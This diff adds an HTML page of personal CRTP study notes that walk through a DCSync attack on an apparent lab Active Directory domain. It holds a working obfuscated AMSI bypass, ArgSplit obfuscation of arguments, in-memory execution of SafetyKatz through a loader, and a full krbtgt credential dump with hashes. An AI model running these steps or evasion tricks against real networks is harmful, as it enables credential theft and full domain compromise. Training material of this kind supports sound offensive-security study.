@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DCSync Attack - CRTP</title>
+  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .home-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .home-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content pre code { background: transparent; padding: 0; color: #d6d6d6; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="home-link">← Home</a>
+          <a href="../../certifications/" class="home-link">← Certifications</a>
+          <h3>Sections</h3>
+          <a href="enumeration.html" class="">Enumeration</a>
+          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
+          <a href="golden-ticket.html" class="">Golden Ticket</a>
+          <a href="silver-ticket.html" class="">Silver Ticket</a>
+          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
+          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
+          <a href="dcsync-attack.html" class="active">DCSync Attack</a>
+          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
+          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
+          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
+          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
+          <a href="rbcd.html" class="">RBCD</a>
+          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
+          <a href="sid-history-krbtgt.html" class="">SID-History KRBTGT</a>
+          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
+          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
+          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
+          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+              <a href="mailto:daviosardinha@gmail.com" class="contact-link">daviosardinha@gmail.com</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">DCSync Attack</header>
+        <section class="about-text">
+          <div class="notion-content">
+<h3>What is a DCSync Attack?</h3>
+<p>A DCSync attack is a type of credential dumping technique used to extract sensitive information from an Active Directory (AD) database. It allows an attacker to simulate the replication process from a remote Domain Controller (DC) and request credentials from another DC, thereby obtaining NTLM hashes of potentially useful accounts such as KRBTGT and Administrators.</p>
+<h3>How Does a DCSync Attack Work?</h3>
+<ol>
+<li>
+<p>Compromise a Privileged Account: The attacker gains access to a standard or non-privileged user account with "Replicating Directory Changes" permission.</p>
+</li>
+<li>
+<p>Discover a Domain Controller: The attacker identifies a DC in the specified domain.</p>
+</li>
+<li>
+<p>Request Replication: Using the Microsoft Directory Replication Service Remote (MS-DRSR) protocol, the attacker requests the DC to replicate sensitive information such as password hashes.</p>
+</li>
+<li>
+<p>Obtain NTLM Hashes: The attacker uses the collected hashes to create a Golden Ticket and potentially run a Pass the Ticket (PTT) attack to gain unrestricted access to the complete AD domain.</p>
+</li>
+</ol>
+<h3>Tools Used</h3>
+<ul>
+<li>
+<p>Mimikatz: The "lsadump" module in Mimikatz is used to perform DCSync attacks. The commands lsadump::dcsync /user:attivo1\krbtgt and lsadump::dcsync /user:attivo1\Administrator are used to extract hashes for KRBTGT and Administrators.</p>
+</li>
+<li>
+<p>Impacket's secretsdump: This tool performs the same attack as Mimikatz.</p>
+</li>
+<li>
+<p>DSInternals Get-ADReplAccount: This tool also performs a DCSync attack.</p>
+</li>
+</ul>
+<h1>Enumeration</h1>
+<p>For this attack to work, user must have Replication Rights. We can start by enumerating the User Rights via PowerShell.</p>
+<p>Note that, this lab will assume that we do have to AV enabled.</p>
+<p>We start by executing <a href="https://github.com/OmerYa/Invisi-Shell">Invisi-Shell</a>to bypass all of Powershell security features (ScriptBlock logging, Module logging, Transcription, AMSI) and then  AMSI bypass.</p>
+<p>Not I’m using the <code>RunWithPathAsAdmin.bat</code> because I’m already an administrator on the machine, otherwise I should be running the <code>RunWithRegistryNonAdmin.bat</code></p>
+<p><code>RunWithPathAsAdmin.bat</code></p>
+<p>AMSI Bypass</p>
+<div class="highlight"><pre><span></span><code>S<span class="sb">`</span>eT-It<span class="sb">`</span>em<span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="s1">&#39;V&#39;</span>+<span class="s1">&#39;aR&#39;</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;IA&#39;</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;blE:1&#39;</span>+<span class="s1">&#39;q2&#39;</span><span class="o">)</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="s1">&#39;uZ&#39;</span>+<span class="s1">&#39;x&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">([</span>TYpE<span class="o">](</span><span class="w"> </span><span class="s2">&quot;{1}{0}&quot;</span>-F<span class="s1">&#39;F&#39;</span>,<span class="s1">&#39;rE&#39;</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>Get-varI<span class="sb">`</span>A<span class="sb">`</span>BLE<span class="w"> </span><span class="o">((</span><span class="s1">&#39;1Q&#39;</span>+<span class="s1">&#39;2U&#39;</span><span class="o">)</span><span class="w"> </span>+<span class="s1">&#39;zX&#39;</span><span class="w"> </span><span class="o">)</span><span class="w"> </span>-VaL<span class="w"> </span><span class="o">)</span>.<span class="s2">&quot;A`ss`Embly&quot;</span>.<span class="s2">&quot;GET`TY`Pe&quot;</span><span class="o">((</span><span class="s2">&quot;{6}{3}{1}{4}{2}{0}{5}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;Uti&#39;</span>+<span class="s1">&#39;l&#39;</span><span class="o">)</span>,<span class="s1">&#39;A&#39;</span>,<span class="o">(</span><span class="s1">&#39;Am&#39;</span>+<span class="s1">&#39;si&#39;</span><span class="o">)</span>,<span class="o">(</span><span class="s1">&#39;.Man&#39;</span>+<span class="s1">&#39;age&#39;</span>+<span class="s1">&#39;men&#39;</span>+<span class="s1">&#39;t.&#39;</span><span class="o">)</span>,<span class="o">(</span><span class="s1">&#39;u&#39;</span>+<span class="s1">&#39;to&#39;</span>+<span class="s1">&#39;mation.&#39;</span><span class="o">)</span>,<span class="s1">&#39;s&#39;</span>,<span class="o">(</span><span class="s1">&#39;Syst&#39;</span>+<span class="s1">&#39;em&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="o">)</span>.<span class="s2">&quot;g`etf`iElD&quot;</span><span class="o">(</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="s2">&quot;{0}{2}{1}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;a&#39;</span>+<span class="s1">&#39;msi&#39;</span><span class="o">)</span>,<span class="s1">&#39;d&#39;</span>,<span class="o">(</span><span class="s1">&#39;I&#39;</span>+<span class="s1">&#39;nitF&#39;</span>+<span class="s1">&#39;aile&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">)</span>,<span class="o">(</span><span class="w"> </span><span class="s2">&quot;{2}{4}{0}{1}{3}&quot;</span><span class="w"> </span>-f<span class="o">(</span><span class="s1">&#39;S&#39;</span>+<span class="s1">&#39;tat&#39;</span><span class="o">)</span>,<span class="s1">&#39;i&#39;</span>,<span class="o">(</span><span class="s1">&#39;Non&#39;</span>+<span class="s1">&#39;Publ&#39;</span>+<span class="s1">&#39;i&#39;</span><span class="o">)</span>,<span class="s1">&#39;c&#39;</span>,<span class="s1">&#39;c,&#39;</span><span class="w"> </span><span class="o">))</span>.<span class="s2">&quot;sE`T`VaLUE&quot;</span><span class="o">(</span><span class="si">${</span><span class="nv">n</span><span class="sb">`</span>ULl<span class="o">}</span>,<span class="si">${</span><span class="nv">t</span><span class="sb">`</span>RuE<span class="o">}</span><span class="w"> </span><span class="o">)</span>
+</code></pre></div>
+
+<p>Now let’s start by Importing PowerView.ps1 modules.</p>
+<p><code>. .\PowerView.ps1</code></p>
+<p><code>Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student451"}</code></p>
+<h3>Explanation</h3>
+<ol>
+<li>Get-DomainObjectAcl:</li>
+<li>This cmdlet retrieves the ACLs (Access Control Lists) for objects in the specified domain.</li>
+<li>SearchBase: Specifies the base DN for the search. In this case, it is set to "DC=dollarcorp,DC=moneycorp,DC=local".</li>
+<li>SearchScope: Defines the scope of the search. Here, it is set to "Base", which means it will only search the base object specified in the SearchBase parameter.</li>
+<li>
+<p>ResolveGUIDs: This parameter resolves GUIDs to their corresponding names.</p>
+</li>
+<li>
+<p>This cmdlet retrieves the ACLs (Access Control Lists) for objects in the specified domain.</p>
+</li>
+<li>
+<p>SearchBase: Specifies the base DN for the search. In this case, it is set to "DC=dollarcorp,DC=moneycorp,DC=local".</p>
+</li>
+<li>
+<p>SearchScope: Defines the scope of the search. Here, it is set to "Base", which means it will only search the base object specified in the SearchBase parameter.</p>
+</li>
+<li>
+<p>ResolveGUIDs: This parameter resolves GUIDs to their corresponding names.</p>
+</li>
+<li>
+<p>Filtering:</p>
+</li>
+<li>
+<p>The?operator is used to filter the results. It checks if theObjectAceTypematches "replication-get" or if theActiveDirectoryRightsmatch "GenericAll". These conditions are used to identify users with DCSync rights.</p>
+</li>
+<li>
+<p>The ? operator is used to filter the results. It checks if the ObjectAceType matches "replication-get" or if the ActiveDirectoryRights match "GenericAll". These conditions are used to identify users with DCSync rights.</p>
+</li>
+<li>
+<p>Adding IdentityName:</p>
+</li>
+<li>TheForEach-Objectcmdlet is used to iterate over the filtered results.</li>
+<li>
+<p>It adds a new property called "IdentityName" to each object by converting theSecurityIdentifierto a name using theConvert-SidToNamefunction.</p>
+</li>
+<li>
+<p>The ForEach-Object cmdlet is used to iterate over the filtered results.</p>
+</li>
+<li>
+<p>It adds a new property called "IdentityName" to each object by converting the SecurityIdentifier to a name using the Convert-SidToName function.</p>
+</li>
+<li>
+<p>Final Filtering:</p>
+</li>
+<li>
+<p>The final?operator filters the results to only include objects where theIdentityNamematches "student451".</p>
+</li>
+<li>
+<p>The final ? operator filters the results to only include objects where the IdentityName matches "student451".</p>
+</li>
+</ol>
+<p>Above by analyzing our student451 Rights, we can see that we do have <code>DS-Replication-Get-Changes-In-Filtered-Set</code> enabled in <code>ObjectAceType</code> property.</p>
+<p>OK. we can see above that we do have Replication Rights on our user.
+We can use the student Right to do a DCSync attack by requesting KRBTGT hashes, any valid user in the domain or even dump all Domain users Hashes.</p>
+<p><code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only.</p>
+<p>It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>Execute argSplit.exe and type:</p>
+<p><code>lsadump::dcsync</code></p>
+<div class="highlight"><pre><span></span><code><span class="nb">set</span><span class="w"> </span><span class="s2">&quot;z=c&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;y=n&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;x=y&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;w=s&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;v=c&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;u=d&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;t=:&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;s=:&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;r=p&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;q=m&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;p=u&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;o=d&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;n=a&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;m=s&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;l=l&quot;</span>
+<span class="nb">set</span><span class="w"> </span><span class="s2">&quot;Pwn=%l%%m%%n%%o%%p%%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Invoking SafetyKatz.exe using PELoader.exe.</p>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit”</code></p>
+<div class="highlight"><pre><span></span><code>**<span class="w"> </span>SAM<span class="w"> </span>ACCOUNT<span class="w"> </span>**
+
+SAM<span class="w"> </span>Username<span class="w">         </span>:<span class="w"> </span>krbtgt
+Account<span class="w"> </span>Type<span class="w">         </span>:<span class="w"> </span><span class="m">30000000</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>USER_OBJECT<span class="w"> </span><span class="o">)</span>
+User<span class="w"> </span>Account<span class="w"> </span>Control<span class="w"> </span>:<span class="w"> </span><span class="m">00000202</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>ACCOUNTDISABLE<span class="w"> </span>NORMAL_ACCOUNT<span class="w"> </span><span class="o">)</span>
+Account<span class="w"> </span>expiration<span class="w">   </span>:
+Password<span class="w"> </span>last<span class="w"> </span>change<span class="w"> </span>:<span class="w"> </span><span class="m">11</span>/11/2022<span class="w"> </span><span class="m">10</span>:59:41<span class="w"> </span>PM
+Object<span class="w"> </span>Security<span class="w"> </span>ID<span class="w">   </span>:<span class="w"> </span>S-1-5-21-719815819-3726368948-3917688648-502
+Object<span class="w"> </span>Relative<span class="w"> </span>ID<span class="w">   </span>:<span class="w"> </span><span class="m">502</span>
+
+Credentials:
+<span class="w">  </span>Hash<span class="w"> </span>NTLM:<span class="w"> </span>4e9815869d2090ccfca61c1fe0d23986
+<span class="w">    </span>ntlm-<span class="w"> </span><span class="m">0</span>:<span class="w"> </span>4e9815869d2090ccfca61c1fe0d23986
+<span class="w">    </span>lm<span class="w">  </span>-<span class="w"> </span><span class="m">0</span>:<span class="w"> </span>ea03581a1268674a828bde6ab09db837
+
+Supplemental<span class="w"> </span>Credentials:
+*<span class="w"> </span>Primary:NTLM-Strong-NTOWF<span class="w"> </span>*
+<span class="w">    </span>Random<span class="w"> </span>Value<span class="w"> </span>:<span class="w"> </span>6d4cc4edd46d8c3d3e59250c91eac2bd
+
+*<span class="w"> </span>Primary:Kerberos-Newer-Keys<span class="w"> </span>*
+<span class="w">    </span>Default<span class="w"> </span>Salt<span class="w"> </span>:<span class="w"> </span>DOLLARCORP.MONEYCORP.LOCALkrbtgt
+<span class="w">    </span>Default<span class="w"> </span>Iterations<span class="w"> </span>:<span class="w"> </span><span class="m">4096</span>
+<span class="w">    </span>Credentials
+<span class="w">      </span>aes256_hmac<span class="w">       </span><span class="o">(</span><span class="m">4096</span><span class="o">)</span><span class="w"> </span>:<span class="w"> </span>154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+<span class="w">      </span>aes128_hmac<span class="w">       </span><span class="o">(</span><span class="m">4096</span><span class="o">)</span><span class="w"> </span>:<span class="w"> </span>e74fa5a9aa05b2c0b2d196e226d8820e
+<span class="w">      </span>des_cbc_md5<span class="w">       </span><span class="o">(</span><span class="m">4096</span><span class="o">)</span><span class="w"> </span>:<span class="w"> </span>150ea2e934ab6b80
+
+*<span class="w"> </span>Primary:Kerberos<span class="w"> </span>*
+<span class="w">    </span>Default<span class="w"> </span>Salt<span class="w"> </span>:<span class="w"> </span>DOLLARCORP.MONEYCORP.LOCALkrbtgt
+<span class="w">    </span>Credentials
+<span class="w">      </span>des_cbc_md5<span class="w">       </span>:<span class="w"> </span>150ea2e934ab6b80
+
+*<span class="w"> </span>Packages<span class="w"> </span>*
+<span class="w">    </span>NTLM-Strong-NTOWF
+
+*<span class="w"> </span>Primary:WDigest<span class="w"> </span>*
+<span class="w">    </span><span class="m">01</span><span class="w">  </span>a0e60e247b498de4cacfac3ba615af01
+<span class="w">    </span><span class="m">02</span><span class="w">  </span>86615bb9bf7e3c731ba1cb47aa89cf6d
+<span class="w">    </span><span class="m">03</span><span class="w">  </span>637dfb61467fdb4f176fe844fd260bac
+<span class="w">    </span><span class="m">04</span><span class="w">  </span>a0e60e247b498de4cacfac3ba615af01
+<span class="w">    </span><span class="m">05</span><span class="w">  </span>86615bb9bf7e3c731ba1cb47aa89cf6d
+<span class="w">    </span><span class="m">06</span><span class="w">  </span>d2874f937df1fd2b05f528c6e715ac7a
+<span class="w">    </span><span class="m">07</span><span class="w">  </span>a0e60e247b498de4cacfac3ba615af01
+<span class="w">    </span><span class="m">08</span><span class="w">  </span>e8ddc0d55ac23e847837791743b89d22
+<span class="w">    </span><span class="m">09</span><span class="w">  </span>e8ddc0d55ac23e847837791743b89d22
+<span class="w">    </span><span class="m">10</span><span class="w">  </span>5c324b8ab38cfca7542d5befb9849fd9
+<span class="w">    </span><span class="m">11</span><span class="w">  </span>f84dfb60f743b1368ea571504e34863a
+<span class="w">    </span><span class="m">12</span><span class="w">  </span>e8ddc0d55ac23e847837791743b89d22
+<span class="w">    </span><span class="m">13</span><span class="w">  </span>2281b35faded13ae4d78e33a1ef26933
+<span class="w">    </span><span class="m">14</span><span class="w">  </span>f84dfb60f743b1368ea571504e34863a
+<span class="w">    </span><span class="m">15</span><span class="w">  </span>d9ef5ed74ef473e89a570a10a706813e
+<span class="w">    </span><span class="m">16</span><span class="w">  </span>d9ef5ed74ef473e89a570a10a706813e
+<span class="w">    </span><span class="m">17</span><span class="w">  </span>87c75daa20ad259a6f783d61602086aa
+<span class="w">    </span><span class="m">18</span><span class="w">  </span>f0016c07fcff7d479633e8998c75bcf7
+<span class="w">    </span><span class="m">19</span><span class="w">  </span>7c4e5eb0d5d517f945cf22d74fec380e
+<span class="w">    </span><span class="m">20</span><span class="w">  </span>cb97816ac064a567fe37e8e8c863f2a7
+<span class="w">    </span><span class="m">21</span><span class="w">  </span>5adaa49a00f2803658c71f617031b385
+<span class="w">    </span><span class="m">22</span><span class="w">  </span>5adaa49a00f2803658c71f617031b385
+<span class="w">    </span><span class="m">23</span><span class="w">  </span>6d86f0be7751c8607e4b47912115bef2
+<span class="w">    </span><span class="m">24</span><span class="w">  </span>caa61bbf6b9c871af646935febf86b95
+<span class="w">    </span><span class="m">25</span><span class="w">  </span>caa61bbf6b9c871af646935febf86b95
+<span class="w">    </span><span class="m">26</span><span class="w">  </span>5d8e8f8f63b3bb6dd48db5d0352c194c
+<span class="w">    </span><span class="m">27</span><span class="w">  </span>3e139d350a9063db51226cfab9e42aa1
+<span class="w">    </span><span class="m">28</span><span class="w">  </span>d745c0538c8fd103d71229b017a987ce
+<span class="w">    </span><span class="m">29</span><span class="w">  </span>40b43724fa76e22b0d610d656fb49ddd
+
+mimikatz<span class="o">(</span>commandline<span class="o">)</span><span class="w"> </span><span class="c1"># exit</span>
+Bye!
+</code></pre></div>
+
+<p>We were able to do a DCSync Attack.</p>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
